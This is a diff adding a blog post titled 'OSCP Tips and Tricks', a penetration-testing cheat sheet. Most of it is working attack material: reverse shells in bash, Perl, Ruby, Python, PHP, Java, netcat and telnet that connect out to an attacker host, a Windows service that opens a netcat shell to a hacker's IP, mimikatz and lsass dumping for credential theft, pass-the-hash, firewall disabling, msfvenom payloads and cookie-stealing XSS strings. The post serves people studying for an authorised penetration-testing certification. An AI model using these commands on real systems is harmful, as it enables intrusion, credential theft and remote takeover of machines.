@@ -1,0 +1,649 @@
+---
+layout: post
+title: "OSCP Tips and Tricks"
+modified: 2015-07-01 10:03:31 +0300
+category: [howto]
+tags: [security,linux,oscp]
+image:
+  feature: 
+  credit: 
+  creditlink: 
+comments: True
+share: 
+---
+OSCP (Offensive Security Certified Professional) Handy Tips and Tricks.
+
+<section id="table-of-contents" class="toc">
+<header>
+<h3>Contents</h3>
+</header>
+<div id="drawer" markdown="1">
+*  Auto generated table of contents
+{:toc}
+</div>
+</section><!-- /#table-of-contents -->
+
+### Nmap Full Web Vulnerable Scan
+{% highlight bash %}
+cd /usr/share/nmap/scripts/
+wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
+nmap -sS -sV --script=vulscan/vulscan.nse target
+nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
+nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
+nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
+nmap -sV --script=vuln target
+nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
+{% endhighlight %}
+
+### Dirb Dir Bruteforce:
+{% highlight bash %}
+dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
+{% endhighlight %}
+
+### Nikto web server scanner
+{% highlight bash %}
+nikto -C all -h http://IP
+{% endhighlight %}
+
+### WordPress Scanner
+{% highlight bash %}
+git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
+./wpscan –url http://IP/ –enumerate p
+{% endhighlight %}
+
+### HTTP Fingerprinting
+{% highlight bash %}
+wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
+cd httprint_301/linux/
+./httprint -h http://IP -s signatures.txt
+{% endhighlight %}
+
+### SKIP Fish Scanner
+{% highlight bash %}
+skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
+{% endhighlight %}
+
+### Nmap Ports Scan
+{% highlight bash %}
+1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)
+1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)
+2)fargement
+3)data packed – like orginal one not scan packet
+4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target
+5)nmap –source-port 53 target
+nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)
+nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
+nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)
+nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)
+nmap -sA -PN -sN target
+nmap -sS -sV -T5 -F -A -O target (version detection)
+nmap -sU -v target (Udp)
+nmap -sU -P0 (Udp)
+nmap -sC 192.168.31.10-12 (all scan default)
+{% endhighlight %}
+
+### NC Scanning
+{% highlight bash %}
+nc -v -w 1 target -z 1-1000
+for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
+{% endhighlight %}
+
+### Unicornscan 
+{% highlight bash %}
+us -H -msf -Iv 192.168.56.101 -p 1-65535
+us -H -mU -Iv 192.168.56.101 -p 1-65535
+
+-H resolve hostnames during the reporting phase
+-m scan mode (sf - tcp, U - udp)
+-Iv - verbose
+{% endhighlight %}
+
+### Xprobe2 OS fingerprinting 
+{% highlight bash %}
+xprobe2 -v -p tcp:80:open IP
+{% endhighlight %}
+
+## Samba Enumeration
+{% highlight bash %}
+nmblookup -A target
+smbclient //MOUNT/share -I target -N
+rpcclient -U "" target
+enum4linux target
+{% endhighlight %}
+
+### SNMP Enumeration
+{% highlight bash %}
+snmpget -v 1 -c public IP 
+snmpwalk -v 1 -c public IP
+snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
+{% endhighlight %}
+
+### Windows Useful cmds
+{% highlight bash %}
+net localgroup Users
+net localgroup Administrators
+search dir/s *.doc
+system("start cmd.exe /k $cmd")
+sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
+/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
+mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
+C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
+C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
+{% endhighlight %}
+
+### PuTTY Link tunnel
+{% highlight bash %}
+Forward remote port to local address
+plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP
+{% endhighlight %}
+
+### Enable RDP Access
+{% highlight bash %}
+reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
+{% endhighlight %}
+
+### Turn Off Windows Firewall
+{% highlight bash %}
+netsh firewall set opmode disable
+{% endhighlight %}
+
+### Meterpreter VNC 
+{% highlight bash %}
+run getgui -u admin -p 1234
+run vnc -p 5043
+{% endhighlight %}
+
+### Add New user in Windows
+{% highlight bash %}
+net user test 1234 /add
+net localgroup administrators test /add
+{% endhighlight %}
+
+### Mimikatz use
+{% highlight bash %}
+git clone https://github.com/gentilkiwi/mimikatz.git
+privilege::debug
+sekurlsa::logonPasswords full
+{% endhighlight %}
+
+### Passing the Hash
+{% highlight bash %}
+git clone https://github.com/byt3bl33d3r/pth-toolkit
+pth-winexe -U hash //IP cmd
+
+or
+
+apt-get install freerdp-x11
+xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
+{% endhighlight %}
+
+### Hashcat password cracking
+{% highlight bash %}
+hashcat -m 400 -a 0 hash /root/rockyou.txt
+{% endhighlight %}
+
+## Netcat examples
+{% highlight bash %}
+c:> nc -l -p 31337
+#nc 192.168.0.10 31337
+c:> nc -v -w 30 -p 31337 -l < secret.txt
+#nc -v -w 2 192.168.0.10 31337 > secret.txt
+{% endhighlight %}
+
+## Banner grabbing with NC
+{% highlight bash %}
+nc 192.168.0.10 80
+GET / HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Mozilla/4.0 
+Referrer: www.example.com
+<enter>
+<enter>
+{% endhighlight %}
+
+### Window reverse shell
+{% highlight bash %}
+c:>nc -Lp 31337 -vv -e cmd.exe
+nc 192.168.0.10 31337
+c:>nc example.com 80 -e cmd.exe
+nc -lp 80
+ 
+nc -lp 31337 -e /bin/bash
+nc 192.168.0.10 31337
+nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
+{% endhighlight %}
+
+### Find SUID\SGID root files
+{% highlight bash %}
+# Find SUID root files
+find / -user root -perm -4000 -print
+ 
+# Find SGID root files:
+find / -group root -perm -2000 -print
+ 
+# Find SUID and SGID files owned by anyone:
+find / -perm -4000 -o -perm -2000 -print
+ 
+# Find files that are not owned by any user:
+find / -nouser -print
+ 
+# Find files that are not owned by any group:
+find / -nogroup -print
+ 
+# Find symlinks and what they point to:
+find / -type l -ls
+{% endhighlight %}
+
+### Python shell
+{% highlight bash %}
+python -c 'import pty;pty.spawn("/bin/bash")'
+{% endhighlight %}
+
+### Python\Ruby\PHP HTTP Server
+{% highlight bash %}
+python2 -m SimpleHTTPServer
+python3 -m http.server
+ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start"
+php -S 0.0.0.0:8888
+{% endhighlight %}
+
+### Get PIDs of process
+{% highlight bash %}
+fuser -nv tcp 80 
+fuser -k -n tcp 80
+{% endhighlight %}
+
+### Hydra rdp Bruteforce
+{% highlight bash %}
+hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
+{% endhighlight %}
+
+### Mount Remote Windows Share
+{% highlight bash %}
+smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
+{% endhighlight %}
+
+### Compiling Exploit in Kali
+{% highlight bash %}
+gcc -m32 -o output32 hello.c (32 bit)
+gcc -m64 -o output hello.c (64 bit)
+{% endhighlight %}
+
+### Compiling Windows Exploits on Kali
+{% highlight bash %}
+wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
+wine mingw-get-setup.exe
+select mingw32-base
+cd /root/.wine/drive_c/windows
+wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
+cd /root/.wine/drive_c/MinGW/bin
+wine gcc -o ability.exe /tmp/exploit.c -lwsock32
+wine ability.exe
+{% endhighlight %}
+
+### NASM Commands
+{% highlight bash %}
+nasm -f bin -o payload.bin payload.asm
+nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
+{% endhighlight %}
+
+### SSH Pivoting 
+{% highlight bash %}
+ssh -D 127.0.0.1:1080 -p 22 user@IP
+Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
+proxychains commands target
+{% endhighlight %}
+
+### SSH Pivoting from One Network to Another
+{% highlight bash %}
+ssh -D 127.0.0.1:1080 -p 22 user1@IP1
+Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
+proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
+Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
+proxychains commands target
+{% endhighlight %}
+
+### Pivoting Using metasploit
+{% highlight bash %}
+route add IP 255.255.255.0 1
+use auxiliary/server/socks4a
+run
+proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E
+{% endhighlight %}
+
+### Exploit-DB search using CSV File
+{% highlight bash %}
+git clone https://github.com/offensive-security/exploit-database.git
+cd exploit-database
+./searchsploit –u
+./searchsploit apache 2.2
+./searchsploit "Linux Kernel"
+
+cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep "<|<=" | sort -k3
+{% endhighlight %}
+
+### MSF Payloads
+{% highlight bash %}
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c
+{% endhighlight %}
+
+### MSF Linux Reverse Meterpreter Binary
+{% highlight bash %}
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
+{% endhighlight %}
+
+### MSF Reverse Shell (C Shellcode)
+{% highlight bash %}
+msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c
+{% endhighlight %}
+
+### MSF Reverse Shell Python Script
+{% highlight bash %}
+msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
+{% endhighlight %}
+
+### MSF Reverse ASP Shell
+{% highlight bash %}
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 --platform win -o shell.asp
+{% endhighlight %}
+
+### MSF Reverse Bash Shell
+{% highlight bash %}
+msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
+{% endhighlight %}
+
+### MSF Reverse PHP Shell
+{% highlight bash %}
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
+add <?php at the beginning
+perl -i~ -0777pe's/^/<?php \n/' shell.php 
+{% endhighlight %}
+
+### MSF Reverse Win Bin
+{% highlight bash %}
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
+{% endhighlight %}
+
+### Linux Security Commands
+{% highlight bash %}
+# find programs with a set uid bit
+find / -uid 0 -perm -4000
+ 
+# find things that are world writable
+find / -perm -o=w
+ 
+# find names with dots and spaces, there shouldn’t be any
+find / -name " " -print
+find / -name ".." -print
+find / -name ". " -print
+find / -name " " -print
+ 
+# find files that are not owned by anyone
+find / -nouser
+ 
+# look for files that are unlinked
+lsof +L1
+ 
+# get information about procceses with open ports
+lsof -i
+
+# look for weird things in arp
+arp -a
+ 
+# look at all accounts including AD
+getent passwd
+ 
+# look at all groups and membership including AD
+getent group
+ 
+# list crontabs for all users including AD
+for user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done
+ 
+# generate random passwords
+cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4
+ 
+# find all immutable files, there should not be any
+find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
+ 
+# fix immutable files
+chattr -i file
+{% endhighlight %}
+
+### Win Buffer Overflow Exploit Commands
+{% highlight bash %}
+msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f c
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f c
+
+COMMONLY USED BAD CHARACTERS:
+\x00\x0a\x0d\x20                              For http request
+\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)
+
+# Useful Commands:
+pattern create
+pattern offset (EIP Address)
+pattern offset (ESP Address)
+add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )
+ 
+!pvefindaddr pattern_create 5000
+!pvefindaddr suggest
+!pvefindaddr modules
+!pvefindaddr nosafeseh
+ 
+!mona config -set workingfolder C:\Mona\%p
+!mona config -get workingfolder
+!mona mod
+!mona bytearray -b "\x00\x0a"
+!mona pc 5000
+!mona po EIP
+!mona suggest
+{% endhighlight %}
+
+### SEH - Structured Exception Handling
+{% highlight bash %}
+https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
+!mona suggest
+!mona nosafeseh
+nseh="\xeb\x06\x90\x90" (next seh chain)
+iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
+{% endhighlight %}
+
+### ROP (DEP)
+{% highlight bash %}
+https://en.wikipedia.org/wiki/Return-oriented_programming
+https://en.wikipedia.org/wiki/Data_Execution_Prevention
+!mona modules
+!mona ropfunc -m *.dll -cpb "\x00\x09\x0a"
+!mona rop -m *.dll -cpb "\x00\x09\x0a" (auto suggest)
+{% endhighlight %}
+
+### ASLR - Address space layout randomization
+{% highlight bash %}
+https://en.wikipedia.org/wiki/Address_space_layout_randomization
+!mona noaslr
+{% endhighlight %}
+
+### EGG Hunter techniques
+{% highlight bash %}
+https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
+http://www.fuzzysecurity.com/tutorials/expDev/4.html
+!mona jmp -r esp
+!mona egg -t lxxl
+\xeb\xc4 (jump backward -60)
+buff=lxxllxxl+shell
+!mona egg -t 'w00t'
+{% endhighlight %}
+
+### GDB Debugger Commands
+{% highlight bash %}
+# Setting Breakpoint
+break *_start
+ 
+# Execute Next Instruction
+next
+step
+n
+s
+ 
+# Continue Execution
+continue
+c
+ 
+# Data
+checking 'REGISTERS' and 'MEMORY'
+
+# Display Register Values: (Decimal,Binary,Hex)
+print /d –> Decimal
+print /t –> Binary
+print /x –> Hex
+O/P :
+(gdb) print /d $eax
+$17 = 13
+(gdb) print /t $eax
+$18 = 1101
+(gdb) print /x $eax
+$19 = 0xd
+(gdb)
+
+# Display values of specific memory locations
+command : x/nyz (Examine)
+n –> Number of fields to display ==>
+y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
+z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)
+{% endhighlight %}
+
+### BASH Reverse Shell
+{% highlight bash %}
+bash -i >& /dev/tcp/X.X.X.X/443 0>&1
+ 
+exec /bin/bash 0&0 2>&0
+exec /bin/bash 0&0 2>&0
+ 
+0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
+ 
+0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
+ 
+exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
+exec 5<>/dev/tcp/attackerip/4444
+ 
+cat <&5 | while read line; do $line 2>&5 >&5; done # or:
+while read line 0<&5; do $line 2>&5 >&5; done
+ 
+/bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
+/bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1
+{% endhighlight %}
+
+### PERL Reverse Shell
+{% highlight bash %}
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+# for win platform
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’
+{% endhighlight %}
+
+### RUBY Reverse Shell
+{% highlight bash %}
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ 
+# for win platform
+ruby -rsocket -e 'c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ruby -rsocket -e 'f=TCPSocket.open("attackerip","443").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+{% endhighlight %}
+
+### PYTHON Reverse Shell
+{% highlight bash %}
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+{% endhighlight %}
+ 
+### PHP Reverse Shell
+{% highlight bash %}
+php -r '$sock=fsockopen("attackerip",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+{% endhighlight %}
+
+### JAVA Reverse Shell
+{% highlight bash %}
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+{% endhighlight %}
+
+### NETCAT Reverse Shell
+{% highlight bash %}
+nc -e /bin/sh attackerip 4444
+nc -e /bin/sh 192.168.37.10 443
+ 
+# If the -e option is disabled, try this 
+# mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
+/bin/sh | nc attackerip 443
+rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/
+ 
+# If you have the wrong version of netcat installed, try 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f
+{% endhighlight %}
+
+### TELNET Reverse Shell
+{% highlight bash %}
+# If netcat is not available or /dev/tcp
+mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe
+{% endhighlight %}
+
+### XTERM Reverse Shell
+{% highlight bash %}
+ 
+# Start an open X Server on your system (:1 – which listens on TCP port 6001)
+apt-get install xnest
+Xnest :1
+ 
+# Then remember to authorise on your system the target IP to connect to you
+xterm -display 127.0.0.1:1
+
+# Run this INSIDE the spawned xterm on the open X Server
+xhost +targetip 
+ 
+# Then on the target connect back to the your X Server
+xterm -display attackerip:1
+/usr/openwin/bin/xterm -display attackerip:1
+or
+$ DISPLAY=attackerip:0 xterm
+{% endhighlight %}
+
+### XSS Cheat Codes
+{% highlight bash %}
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+("< iframes > src=http://IP:PORT </ iframes >")
+ 
+<script>document.location=http://IP:PORT</script>
+ 
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+ 
+";!–"<XSS>=&amp;amp;{()}
+ 
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"">
+<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>
+ 
+<IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
+<IMG SRC="jav ascript:alert('XSS');">
+ 
+perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out
+ 
+<BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+(">< iframes http://google.com < iframes >)
+ 
+<BODY BACKGROUND="javascript:alert('XSS')">
+<FRAMESET><FRAME SRC=”javascript:alert('XSS');"></FRAMESET>
+"><script >alert(document.cookie)</script>
+%253cscript%253ealert(document.cookie)%253c/script%253e
+"><s"%2b"cript>alert(document.cookie)</script>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
+<img src=asdf onerror=alert(document.cookie)>
+{% endhighlight %}
